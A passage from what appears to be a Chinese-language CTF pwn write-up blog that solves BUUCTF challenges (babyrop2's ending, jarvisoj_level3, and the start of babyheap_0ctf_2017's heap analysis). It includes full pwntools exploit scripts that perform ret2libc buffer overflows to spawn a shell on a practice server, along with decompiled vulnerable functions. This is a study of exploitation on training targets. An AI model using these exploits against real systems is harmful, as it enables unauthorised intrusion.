p64(sys_addr)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>此外本题的 <kbd>flag</kbd> 并不在根目录，其地址为 <kbd>/home/babyrop2/flag</kbd>。</p></li></ul><h2 id="jarvisoj-level3">jarvisoj_level3</h2><ul><li><p>先验文件，本题文件为 <kbd>32</kbd> 位可执行文件，仅开启 NX 保护。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ file ./level3    </span><br><span class="line">./level3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=44a438e03b4d2c1abead90f748a4b5500b7a04c7, not stripped</span><br><span class="line"></span><br><span class="line">└─$ checksec ./level3    </span><br><span class="line">[*] <span class="string">&#x27;/home/h-t-m/level3&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>本地执行，程序等待用户输入，完成之后打印固定字符串并退出。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./level3      </span><br><span class="line">Input:</span><br><span class="line">h-t-m myr520</span><br><span class="line">Hello, World!</span><br></pre></td></tr></table></figure></li><li><kbd>IDA</kbd> 反编译查看伪代码，主要调用自定义函数实现输入读取，其中读取限制大于栈偏移，存在 <kbd>0x12</kbd> 字节的栈溢出。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>文件中不含危险套装，因此本题再次需要 <kbd>ret2libc</kbd>。这里使用 <kbd>write()</kbd> 函数泄露 <kbd>read()</kbd> 函数的真实地址，由于查库再次没查出来，因此使用 BUU 的 <kbd>libc</kbd> 文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27587</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./level3&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">wrt_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">vuln_addr = <span class="number">0x804844B</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(wrt_plt) + p32(vuln_addr) + p32(<span class="number">1</span>) + p32(read_got) + p32(<span class="number">4</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr = u32(io.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = LibcSearcher(&#x27;read&#x27;,read_addr)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">base = read_addr - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">sys_addr = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li></ul><h2 id="babyheap-0ctf-2017">babyheap_0ctf_2017</h2><ul><li><p>先验文件，本题文件为 <kbd>64</kbd> 位可执行文件，保护全开，从标题可以看出，堆来了！</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ file ./babyheap_0ctf_2017 </span><br><span class="line">./babyheap_0ctf_2017: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=9e5bfa980355d6158a76acacb7bda01f4e3fc1c2, stripped</span><br><span class="line"></span><br><span class="line">└─$ checksec ./babyheap_0ctf_2017 </span><br><span class="line">[*] <span class="string">&#x27;/home/h-t-m/babyheap_0ctf_2017&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>本地执行，程序提供五个选项，其中前四个对应程序的四个功能，根据测试应该分别对应于内存的分配、填充、释放与输出。此外，程序在一段时间后会自动退出。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./babyheap_0ctf_2017</span><br><span class="line">===== Baby Heap <span class="keyword">in</span> 2017 =====</span><br><span class="line">1. Allocate</span><br><span class="line">2. Fill</span><br><span class="line">3. Free</span><br><span class="line">4. Dump</span><br><span class="line">5. Exit</span><br><span class="line">Command: </span><br></pre></td></tr></table></figure></li><li><kbd>IDA</kbd> 反编译查看伪代码，主函数首先通过调用自定义函数完成堆空间的申请以及基本交互，随后的程序四大功能的实现同样封装于函数中。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = sub_B70(a1, a2, a3);</span><br><span class="line">    <span class="comment">// 使用 mmap() 函数申请 0x1000 字节的空间</span></span><br><span class="line">    <span class="comment">// char *sub_B70()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//   ...</span></span><br><span class="line">    <span class="comment">//	 addr = (char *)((buf[0] % 0x555555543000uLL + 0x10000) &amp; 0xFFFFFFFFFFFFF000LL);</span></span><br><span class="line">    <span class="comment">//   v3 = (buf[1] % 0xE80uLL) &amp; 0xFFFFFFFFFFFFFFF0LL;</span></span><br><span class="line">    <span class="comment">//   if ( mmap(addr, 0x1000uLL, 3, 34, -1, 0LL) != addr )</span></span><br><span class="line">    <span class="comment">//     exit(-1);</span></span><br><span class="line">    <span class="comment">//   return &amp;addr[v3];</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_CF4();</span><br><span class="line">    <span class="comment">// 打印菜单</span></span><br><span class="line">    <span class="keyword">switch</span> ( sub_138C() )</span><br><span class="line">        	 <span class="comment">// 读取用户输入的选项，通过 atol() 函数提取整形数据</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">        sub_D48(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">        sub_E7F(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">        sub_F50(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">        sub_1051(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5LL</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先审计一下 <kbd>Allocate</kbd> 功能的实现函数，该函数在此前使用 <kbd>mmap()</kbd> 申请的空间内写入为用户新分配的各堆空间的信息表，用户每申请一块堆空间便占用 <kbd>24</kbd> 字节，函数依序为每块空间赋予索引并限制只能申请最多 <kbd>16</kbd> 块空间。其中若用户需求空间大于 <kbd>4096</kbd> 则按 <kbd>4096</kbd> 字节分配，分配完成后会对保存新分配空间信息并打印当前空间索引。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">sub_D48</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  <span class="comment">// 限制为 16 块空间以内</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*(_DWORD *)(<span class="number">24LL</span> * i + a1) )</span><br><span class="line">    <span class="comment">// 配合 for 语句逐块空间遍历，找到未被占用的空间为止</span></span><br><span class="line">    <span class="comment">// 每块空间大小为 24 字节</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      v2 = sub_138C();</span><br><span class="line">           <span class="comment">// 读取用户输入的数值，通过 atol() 函数提取整形数据</span></span><br><span class="line">      <span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v2 &gt; <span class="number">4096</span> )</span><br><span class="line">          v2 = <span class="number">4096</span>;</span><br><span class="line">        v3 = <span class="built_in">calloc</span>(v2, <span class="number">1uLL</span>);</span><br><span class="line">        <span class="comment">// 按用户要求分配对应空间，大于 4096 字节的按 4096 分配，calloc 会将空间初始化为 0</span></span><br><span class="line">        <span class="keyword">if</span> ( !v3 )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        *(_DWORD *)(<span class="number">24LL</span> * i + a1) = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 标记已分配</span></span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">24LL</span> * i + <span class="number">8</span>) = v2;</span><br><span class="line">        <span class="comment">// 标识空间大小</span></span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">24LL</span> * i + <span class="number">16</span>) = v3;</span><br><span class="line">        <span class="comment">// 标识空间地址</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Allocate Index %d\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i);</span><br><span class="line">        <span class="comment">// 打印索引</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是 <kbd>Fill</kbd> 功能的实现函数，该函数向用户指定的索引对应堆空间写入数据，值得注意的是，输入数据的长度完全由用户定义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_E7F</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = sub_138C();</span><br><span class="line">  <span class="comment">// 读取用户输入的索引值</span></span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">int</span>)result &lt;= <span class="number">15</span> )</span><br><span class="line">  <span class="comment">// 判断索引值是否合法</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(<span class="number">24LL</span> * (<span class="keyword">int</span>)result + a1);</span><br><span class="line">    <span class="comment">// 指向索引对应堆空间的信息块</span></span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      result = sub_138C();</span><br><span class="line">      v3 = result;</span><br><span class="line">      <span class="comment">// 获取用户将写入的数据的长度</span></span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> sub_11B2(*(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>), v3);</span><br><span class="line">          	   <span class="comment">// 读取用户输入数据并写入对应堆空间，严格遵守用户输入的长度</span></span><br><span class="line">          	   <span class="comment">// unsigned __int64 __fastcall sub_11B2(__int64 a1, unsigned __int64 a2)</span></span><br><span class="line">               <span class="comment">// &#123;</span></span><br><span class="line">               <span class="comment">//   unsigned __int64 v3; // [rsp+10h] [rbp-10h]</span></span><br><span class="line">               <span class="comment">//   ssize_t v4; // [rsp+18h] [rbp-8h]</span></span><br><span class="line">               <span class="comment">//</span></span><br><span class="line">               <span class="comment">//   if ( !a2 )</span></span><br><span class="line">               <span class="comment">//     return 0LL;</span></span><br><span class="line">               <span class="comment">//   v3 = 0LL;</span></span><br><span class="line">               <span class="comment">//   while ( v3 &lt; a2 )</span></span><br><span class="line">               <span class="comment">//   &#123;</span></span><br><span class="line">               <span class="comment">//     v4 = read(0, (void *)(v3 + a1), a2 - v3);</span></span><br><span class="line">               <span class="comment">//     if ( v4 &gt; 0 )</span></span><br><span class="line">               <span class="comment">//     &#123;</span></span><br><span class="line">               <span class="comment">//       v3 += v4;</span></span><br><span class="line">               <span class="comment">//     &#125;</span></span><br><span class="line">               <span class="comment">//     else if ( *_errno_location() != 11 &amp;&amp; *_errno_location() != 4 )</span></span><br><span class="line">               <span class="comment">//     &#123;</span></span><br><span class="line">               <span class="comment">//       return v3;</span></span><br><span class="line">               <span class="comment">//     &#125;</span></span><br><span class="line">               <span class="comment">//   &#125;</span></span><br><span class="line">               <span class="comment">//   return v3;</span></span><br><span class="line">               <span class="comment">// &#125;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是 <kbd>Free</kbd> 功能的实现函数，函数将数据块全部置零并释放对应堆空间。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_F50</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = sub_138C();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">int</span>)result &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 指向用户输入索引所对应的堆空间</span></span><br><span class="line">    result = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(<span class="number">24LL</span> * (<span class="keyword">int</span>)result + a1);</span><br><span class="line">    <span class="comment">// 将数据块全部置零并释放对应堆空间</span></span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(<span class="number">24LL</span> * v2 + a1) = <span class="number">0</span>;</span><br><span class="line">      *(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">8</span>) = <span class="number">0LL</span>;</span><br><span class="line">      <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>));</span><br><span class="line">      result = <span class="number">24LL</span> * v2 + a1;</span><br><span class="line">      *(_QWORD *)(result + <span class="number">16</span>) = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后是 <kbd>Dump</kbd> 功能的实现函数，该函数输出用户指定堆空间中的数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_1051</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = sub_138C();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(_DWORD *)(<span class="number">24LL</span> * result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      sub_130F(*(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>), *(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">8</span>));</span><br><span class="line">       <span class="comment">// 按堆空间大小输出数据</span></span><br><span class="line">       <span class="comment">// unsigned __int64 __fastcall sub_130F(__int64 a1, unsigned __int64 a2)</span></span><br><span class="line">       <span class="comment">// &#123;</span></span><br><span class="line">       <span class="comment">//   unsigned __int64 v3; // [rsp+10h] [rbp-10h]</span></span><br><span class="line">       <span class="comment">//   ssize_t v4; // [rsp+18h] [rbp-8h]</span></span><br><span class="line">       <span class="comment">//</span></span><br><span class="line">       <span class="comment">//   v3 = 0LL;</span></span><br><span class="line">       <span class="comment">//   while ( v3 &lt; a2 )</span></span><br><span class="line">       <span class="comment">//   &#123;</span></span><br><span class="line">       <span class="comment">//     v4 = write(1, (const void *)(v3 + a1), a2 - v3);</span></span><br><span class="line">       <span class="comment">//     if ( v4 &gt; 0 )</span></span><br><span class="line">       <span class="comment">//     &#123;</span></span><br><span class="line">       <span class="comment">//       v3 += v4;</span></span><br><span class="line">       <span class="comment">//     &#125;</span></span><br><span class="line">       <span class="comment">//     else if ( *_errno_location() != 11 &amp;&amp; *_errno_location() != 4 )</span></span><br><span class="line">       <span class="comment">//     &#123;</span></span><br><span class="line">       <span class="comment">//       return v3;</span></span><br><span class="line">       <span class="comment">//     &#125;</span></span><br><span class="line">       <span class="comment">//   &#125;</span></span><br><span class="line">       <span class="comment">//   return v3;</span></span><br><span class="line">       <span class="comment">// &#125;</span></span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(byte_14F1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过上述审计可知，我们可用通过程序的四个功能来完成对于堆空间的操作，其中向堆内存写入数据时并不限制数据长度，因此通过这里可以很方便地对当前堆空间乃至其后大块空间进行写入，也就是堆溢出。在进入下一步前，有必要好好了解一下堆的结构。</p></li><li><p>堆是程序运行时动态分配的内存空间，由低地址向高地址方向增长，与栈正好相反。一般称由 <kbd>malloc</kbd> 申请的内存为 <kbd>chunk</kbd>，<kbd>chunk</kbd> 无论大小与状态都使用如下的结构。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>每个字段的具体的解释如下</p><ul><li><strong>prev_size</strong>, 如果该 chunk 